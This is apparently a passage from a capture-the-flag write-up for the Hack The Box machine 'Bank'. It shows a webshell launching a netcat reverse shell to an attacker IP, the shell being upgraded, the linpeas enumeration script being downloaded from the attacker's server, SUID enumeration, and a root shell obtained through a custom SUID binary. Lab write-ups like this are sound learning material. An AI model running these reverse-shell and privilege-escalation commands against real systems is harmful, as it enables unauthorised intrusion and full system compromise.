The webshell is running.
Gaining a better shell via netcat using `nc -e /bin/sh 10.10.14.9 8080`

http://bank.htb/uploads/simple_oneliner.htb?cmd=nc%20-e%20/bin/sh%2010.10.14.9%208080
```
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.29] 45562
                                                           
```

Elevating the shell:
```
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ stty size;stty raw -echo;fg
39 157
[1]  + continued  nc -lvnp 8080
                               export term=xterm-256color
www-data@bank:/var/www/bank/uploads$ 

```

Uploading enumeration scripts are timing out
```
www-data@bank:/dev/shm$ curl http://10.10.14.9:1337/linpeas.sh -o lin.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                           
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0  933k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--       0  933k    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--       0  933k    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--   
  
<SNIP>

www-data@bank:/dev/shm$ wget http://10.10.14.9:1337/linpeas.sh
--2025-09-19 22:20:45--  http://10.10.14.9:1337/linpeas.sh
Connecting to 10.10.14.9:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: 'linpeas.sh'

 0% [                                       ] 0           --.-K/s             0% [                                       ] 0           --.-K/s             0% [                                       ] 0           --.-K/s             0% [                                       ] 0           --.-K/s             0% [                                       ] 0           --.-K/s             0% [                                       ] 0           --.-K/s 
```


so enumerating manually is the way to go.

## SUID binaries
```
www-data@bank:/dev/shm$ find / -type f -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

`/var/htb/` isn't a common directory. Executing the emergency binary grants a root shell
```
www-data@bank:/dev/shm$ /var/htb/bin/emergency 
# whoami
root
# 

```